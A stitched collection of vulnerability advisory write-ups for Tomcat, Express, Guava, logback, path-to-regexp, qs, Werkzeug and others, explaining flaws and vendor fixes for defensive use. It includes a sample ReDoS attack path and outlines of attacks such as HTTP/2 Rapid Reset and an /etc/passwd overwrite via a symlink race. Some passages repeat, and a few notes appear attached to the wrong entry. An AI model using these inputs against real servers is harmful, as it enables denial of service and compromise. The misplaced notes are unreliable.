A rewrite rule bypass issue exists in Apache Tomcat because the `RewriteValve` functionality does not correctly handle URLs that contain literal escape characters like `%`, `;` and `?`. Specifically, the `invoke()` method of the `java/org/apache/catalina/valves/rewrite/RewriteValve.java` file does not consider the presence of these character such that the rewrite process can be performed in an inconsistent manner and inadvertently leave the characters in the URL in a form that can alter how they are processed elsewhere.

To remedy this issue, the vendor has implemented the new `encodeForRewrite()` method to re-encode any literal `%`, `;` and `?` characters in the URL using the standard `%nn` form. The method is called by `invoke()` to first re-encode these characters in the URL before attempting to rewrite the URL. This allows the characters present in the URL, and any added during the rewrite, to be handled in a consistent manner. The new `REWRITE_DEFAULT_ENCODER` and `REWRITE_QUERY_ENCODER` were also introduced to handle encoding without double-encoding `%` characters.

## Technical Description
File case sensitivity checks can be bypassed because a TOCTOU race condition exists during concurrent HTTP read (GET) and writes (PUT/DELETE) operations performed on the same path on a case insensitive file system. Tomcat does not restrict other processes from acting on the same path at the same time. This race condition can cause corruption of the `FileResource` object associated with the path and result in inconsistencies in some fields.

In order to remedy this issue, the vendor has implemented new methods to lock and unlock resources for read and write operations in the `java/org/apache/catalina/webresources/DirResourceSet.java` file. The `getResource()`, `write()` and `delete()` methods found in `DirResourceSet.java` and `java/org/apache/catalina/webresources/FileResource.java` have been updated to these lock controlling methods to ensure other threads cannot operate on the same resource and corrupt the `FileResource` object.

fullDescription.text:
Apache Tomcat is vulnerable to a remote code execution (RCE) issue due to how file case sensitivity checks can be bypassed in cases where the default servlet is write enabled on a case insensitive file system, and a concurrent read and upload of the same file occurs when Tomcat is under load.

As a result of the bypass, it can be possible for an uploaded file to be treated as a JSP file. This means that during JSP compilation, it is possible for malicious code to be executed on the server.

**Note 1:**: The default servlet is not write enabled by default. This requires the read-only initialization parameter to be set to the non-default value of `false`.

**Note 2:** This issue originally received an incomplete fix due to missing mitigation steps to fully address the issue. **CVE-2024-56337** (**BDSA-2024-9919**) has been released to fully detail how to address this.

## Technical Description
File case sensitivity checks can be bypassed because a TOCTOU race condition exists during concurrent HTTP read (GET) and writes (PUT/DELETE) operations performed on the same path on a case insensitive file system. Tomcat does not restrict other processes from acting on the same path at the same time. This race condition can cause corruption of the `FileResource` object associated with the path and result in inconsistencies in some fields.

In order to remedy this issue, the vendor has implemented new methods to lock and unlock resources for read and write operations in the `java/org/apache/catalina/webresources/DirResourceSet.java` file. The `getResource()`, `write()` and `delete()` methods found in `DirResourceSet.java` and `java/org/apache/catalina/webresources/FileResource.java` have been updated to these lock controlling methods to ensure other threads cannot operate on the same resource and corrupt the `FileResource` object.

Apache Tomcat is vulnerable to a denial-of-service (DoS) issue due to how excessive HTTP headers can be mishandled with processing an HTTP/2 stream.

An attacker could submit a large amount of headers in a HTTP/2 session in order to cause a miscount of active HTTP/2 streams. This could then lead to Tomcat using an incorrect infinite timeout that allows connections to remain open when they otherwise should have been closed. These connections staying open beyond their intended lifetimes could result in performance impacts.

## Technical Description
The `Http2AsyncUpgradeHandler` and `Http2UpgradeHandler` classes make use of the `decrementActiveRemoteStreamCount()` method defined in the `java/org/apache/coyote/http2/Http2UpgradeHandler.java` file to keep track of the count of active streams to enforce the HTTP/2 maximum concurrent streams limit. This method does not consider if the stream count value has already been decremented for a given stream, meaning it can be possible for the `setConnectionTimeoutForStreamCount()` to be supplied an incorrect timeout value.

To remedy this issue, the vendor has implemented the `decrementAndGetActiveRemoteStreamCount()` function to first check if a stream has already been removed from the count before performing any decrement actions.

## Technical Description
The flaw is a race condition in the various `xsltproc` commands run in the `%post` sections of the openSUSE package file `tomcat.spec`. The race condition allows replacing a target file to be written with a symbolic link to an arbitrary file on the system, allowing an arbitrary file write as the `root` user if the race is won. The initial bug report demonstrates using this to write a new root user to the `/etc/passwd` file, that can subsequently be accessed with `su` to obtain a `root` shell on the system.

The issue has been mitigated by updating the `xsltproc` commands in `tomcat.spec` to run as the `tomcat` user.

fullDescription.text:
The HTTP/2 protocol contains a flaw related to the stream multiplexing feature that can allow for excessive resource consumption on servers operating implementations of the HTTP/2 protocol. 

The HTTP/2 protocol allows clients to signal to a server to cancel a previously opened stream by sending an `RST_STREAM` frame. Attackers can abuse this stream canceling ability by opening a large number of streams at once immediately followed by `RST_STREAM` frames. In most HTTP/2 implementations this bypasses concurrent open stream limits and causes servers to spend processing time first handling request frames and then performing stream tear downs. For the server, these operations can pile up whereas the attacker client paid minuscule bandwidth and processing costs.

The HTTP/2 protocol contains a flaw related to the stream multiplexing feature that can allow for excessive resource consumption on servers operating implementations of the HTTP/2 protocol. 

The HTTP/2 protocol allows clients to signal to a server to cancel a previously opened stream by sending an `RST_STREAM` frame. Attackers can abuse this stream canceling ability by opening a large number of streams at once immediately followed by `RST_STREAM` frames. In most HTTP/2 implementations this bypasses concurrent open stream limits and causes servers to spend processing time first handling request frames and then performing stream tear downs. For the server, these operations can pile up whereas the attacker client paid minuscule bandwidth and processing costs.

[Amazon](https://aws.amazon.com/security/security-bulletins/AWS-2023-011/), [Cloudflare](https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/) and [Google](https://cloud.google.com/blog/products/identity-security/google-cloud-mitigated-largest-ddos-attack-peaking-above-398-million-rps/) have reported that this vulnerability has been exploited in the wild from August to October 2023.

This vulnerability is listed as exploitable by the Cybersecurity & Infrastructure Security Agency in their [Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog).

## Technical Description
This vulnerability exists in `savedRequestURL()` function in `java/org/apache/catalina/authenticator/FormAuthenticator.java` file. This function does not contain sufficient validation measures for avoiding protocol relative redirects. This could make a ROOT (default) web application that has been configured to use `FORM` authentication feature vulnerable to open redirects. An attacker could trigger this flaw by tricking a victim into accessing a specially crafted URL that redirects to an attacker-controlled location.

This issue has been fixed in `java/org/apache/catalina/authenticator/FormAuthenticator.java` file by introducing validation measures in `savedRequestURL()` function to avoid protocol relative redirects.

**Note:** This vulnerability only manifests when `rejectIllegalHeader` is set to `false`, which is **not** the default setting for any version higher than the **8.5.x** series.

## Technical Description
The memory leak is caused by `WsHttpUpgradeHandler` in `java/org/apache/tomcat/websocket/server/WsHttpUpgradeHandler.java` not releasing the `WebConnection` for HTTP upgrade metric collection once its `WebSocket` connection is closed. The leak would consume memory resources over time and result in a DoS due to an `OutOfMemoryError`.

The vulnerability was fixed by setting the connection to `null` in the `destroy()` function.

## Technical Description
The vulnerability occurs due to insufficient validation of user supplied URLs passed to the `res.location()` method which is also called from within the `res.redirect()` method. The issue occurs when a redirect is performed using a user supplied URL, Express encodes the contents of the URL using `encodeurl`before passing to the location header. This can result in a bypass of the common redirect allow list and enable an open redirect to potentially malicious / attacker controlled websites.

The issue was addressed by pre-parsing the url string with either `require('node:url').parse` or `new URL`.

## Technical Description
Guava creates temporary directories using the `createTempDir()` method of file `android/guava/src/com/google/common/io/Files.java`. This method uses the `File` class in conjunction with the  `java.io.tmpdir` system property. The `FileBackedOutputStream` class, of file `android/guava/src/com/google/common/io/FileBackedOutputStream.java`, uses the `File.createTempFile()` method in order to create temporary files. The temporary directory that is created via these methods is insecure, in that multiple users on the system may share access to them. This can lead to an authenticated attacker being able to access files that they should not be able to access.

A check has also been introduced on the provided `fileThreshold` in `FileBackedOutputStream` to ensure it is non-negative.

## Technical Description
The vulnerabilities exist in the `AtomicDoubleArray` and `CompoundOrdering` classes. The issue will manifest itself whenever a server running Guava deserializes crafted data sent by an attacker. The problem is that the vulnerable classes accept a caller-specified size parameter and will allocate an array of that size without proper checks. This happens when `AtomicDoubleArray` is serialized with Java serialization or when `CompoundOrdering` class is serialized with GWT serialization. This permits unbounded memory allocation and allows attackers to quickly force the server to allocate all its memory, causing a crash and denial-of-service (DoS).

This vulnerability can be exploited by an attacker to execute remote code through the use of `java.sql.Statement` or `java.sql.PreparedStatement`. They are allowed to call any static method of any Java class in the classpath which permits the the processing of malicious or crafted input.

This has been mitigated in the `src/org/hsqldb/persist/HsqlDatabaseProperties.java` file by ensuring that Java methods used by routines should use `hsqldb.method_class_names`.

## Technical Description
The vulnerability can be exploited by providing a JNDI location in the configuration file which will get picked up by `lookupDataSource` call in `getConnection` method (class `JNDIConnectionSource`). The JNDI location will be looked up regardless of the namespace it is in. This allows for a malicious code to be loaded from arbitrary LDAP servers.

The vulnerability was fixed by:
1. Hardening logback's JNDI lookup mechanism to only honor requests in the `java:` namespace. All other types are ignored.
2. Hardening `SMTPAppenderBase` to use `JNDIUtil.lookup` instead of `initialContext.lookup` for the `initialContext` object. `JNDIUtil.lookup` ensures that JNDI names start with `java:` namespace.
3. Temporarily removing DB support.
4. Removing Groovy configuration support.

## Technical Description
The vulnerability exists in the `logback-classic/src/main/java/ch/qos/logback/classic/spi/LoggingEventVO.java` and `logback-core/src/main/java/ch/qos/logback/core/net/HardenedObjectInputStream.java` files due to improper validation. 

This issue occurs when an attacker with control of a remote appender sends maliciously serialized input to a receiver in the form of excessively large or negative arrays.

It is mitigated in the same files by setting specific array limits through `ARGUMENT_ARRAY_DESERIALIZATION_LIMIT` and including a series of checks to ensure that said limit is not breached

A CVE was released for this vulnerability (**CVE-2023-6378**) but the fix was deemed incomplete. Hence this new CVE was issued to address this. 

**Note**: The fix has been backported to the **1.2.x** branch in version **1.2.13** but will only be effective when run under Java 9 and later.

fullDescription.text:
Path-to-RegExp is vulnerable to a regular expression denial-of-service (ReDoS) issue due to how it is possible for an inefficient expression to be generated for some routes that make use of named parameters.

The expression generated from affected routes is susceptible to excessive backtracking. An attacker could submit a crafted path input to a vulnerable application in order to trigger the backtracking flaw when attempts to match against the path are made. The inefficient matching operations could cause excessive consumption of CPU cycles and result in degraded performance for other clients.

**Note**: this issue exists due to the discovery of an incomplete fix made for **0.1.x** releases to address **CVE-2024-45296** (**BDSA-2024-6246**).

## Dependency tree
* sampleapp/0.0.1-SNAPSHOT/-npm
    * express/4.17.1
        * path-to-regexp/0.1.7


## Technical Description
Path-to-RegExp can produce inefficient regular expressions when an input route contains a series of two or more named parameters within a single segment (between slashes), and these parameters are not separated by a slash (`/`) or period (`.`) character.

For example, `pathToRegexp()` generates `/^\/flights\/([^\/]+?)-([^\/]+?)\/?$/i` when supplied with the `/flights/:from-:to` route. This output regular expression does not account for malformed input paths such that it can be abused with a path that contains a long series of dash (`-`) characters followed by an out of place end character, like `'/flights/' + '-'.repeat(16_000) + '/x'`. 

The expressions produced in these circumstances are vulnerable to excessive backtracking, meaning where a match can no longer be made, the matching algorithm backtracks and attempts other possible matches. The longer the input path, the longer this process can take.

### For Direct Dependency expressjs/express 4.17.1
**Short-Term:**	expressjs/express 4.21.2
**Long-Term:**	expressjs/express 5.1.0

## Solution
The vendor has provided patches that offer varying degrees of protection against this regular expression denial-of-service (ReDoS) issue.

Firstly, the vendor has recommended that users of versions above the **0.1.x** release series should upgrade to version [**8.0.0**](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) or above.
**Note**: This release contains a large breaking change in that it outright removes the regular expression override feature.

A "backtracking protection" mechanism was developed for older releases where a large breaking change was not feasible. The mechanism is active when a custom regex pattern is not provided. This change was made available in:
* [**6.3.0**](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0) with [this](https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894) commit,
* [**3.3.0**](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0) with [this](https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef) commit,
* [**1.9.0**](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0) with [this](https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485) commit,
* [**0.1.12**](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.12) with [this](https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4) commit.

**Warning**: The "backtracking protection" mechanism does not protect against vulnerable user-supplied capture groups. The vendor considers protecting against explicit user-supplied patterns to be out of scope for old versions. The "backtracking protection" measures can also be considered a breaking change for some users.

The latest stable releases are available [here](https://github.com/pillarjs/path-to-regexp/releases).

## Workaround
Version [**7.1.0**](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) offers a non-default `strict` option that can be enabled with `strict: true` in order to receive errors where a regular expression that may cause regular expression denial-of-service (ReDoS) issues is detected. This feature is documented [here](https://github.com/pillarjs/path-to-regexp/blob/v7.1.0/Readme.md#developers).

Aside from the workaround provided in this release, the vendor has also provided the following workaround advice in their [advisory](https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j) that can be applied manually:

> All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.
> 
> If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.

## Technical Description
qs allows setting `__proto__` properties. An attacker could set an array-like object in `proto`, which would cause the resulting object to inherit the `Array` prototype while still remaining an `Object`. qs also allows setting the `length` property of `Object` elements. This means that an attacker could create an array with a large length and cause the Node process to freeze as it tries to convert the array to string values or call most native Array functions.

The vulnerability was fixed by ignoring `__proto__` keys.

## Technical Description
This vulnerability primarily exists in `src/werkzeug/_internal.py` file in its cookie parsing functionality. This file strips the leading `=` sign when parsing a cookie. This will cause the application to parse a cookie like `=__Host-test=bad` as `__Host-test=bad` and thus a new cookie will be set for the application. The primary cause of this flaw is that some vulnerable browsers allow setting of `nameless` cookies i.e. unprefixed cookies like `=value` without a key. If a malicious or a compromised application on an adjacent subdomain sets such an unprefixed cookie via a vulnerable browser, Werkzeug will then strip the leading `=` sign and set this cookie. This will happen because Werkzeug will see this as a bad cookie value but a valid cookie key. Thus, a new cookie will be set in an unauthorized manner.

This issue has been fixed in `src/werkzeug/_internal.py` file by preventing the leading `=` from being stripped when a cookie is being parsed. Thus, a cookie header that starts with `=` will be treated as an empty key and it will be discarded.

## Technical Description
This vulnerability exists because the application does not sufficiently limit the number of parts it will parse from multipart form data received via user input. An attacker can exploit this flaw by supplying a request containing crafted multipart data to an endpoint that accesses `request.data`, `request.form`, `request.files`, or `request.get_data(parse_form_data=False)`. Parsing of this crafted multipart data can result in excessive resource consumption. Exploiting this vulnerability will allow the attacker to cause a denial-of-service.

This issue has been fixed by implementing a maximum limit on the number of multipart form parts (1000 by default) that the application can parse. If the number of parts goes beyond this limit, a `RequestEntityTooLarge` exception will be raised.
